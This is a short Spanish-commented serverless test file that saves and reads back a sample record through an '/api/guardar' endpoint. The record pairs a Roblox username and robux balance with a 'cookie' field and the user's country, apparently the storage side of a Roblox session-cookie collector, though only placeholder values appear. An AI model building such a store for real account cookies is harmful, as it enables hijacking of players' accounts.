// api/test-guardado.js
export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    
    const baseUrl = `https://${req.headers.host}`;
    const testId = `test_${Date.now()}`;
    
    // Datos de prueba
    const testData = {
        roblox: {
            username: "TestUser",
            userId: testId,
            robux: 999
        },
        cookie: "TEST_COOKIE",
        pais: "TestLand",
        fecha: "10/03/2026",
        hora: "12:00:00"
    };
    
    // 1. Intentar guardar
    const guardar = await fetch(`${baseUrl}/api/guardar`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ userId: testId, data: testData })
    });
    const resultadoGuardar = await guardar.json();
    
    // 2. Intentar leer
    const leer = await fetch(`${baseUrl}/api/guardar?userId=${testId}`);
    const resultadoLeer = await leer.json();
    
    res.status(200).json({
        paso1_guardar: resultadoGuardar,
        paso2_leer: resultadoLeer,
        testId: testId
    });
}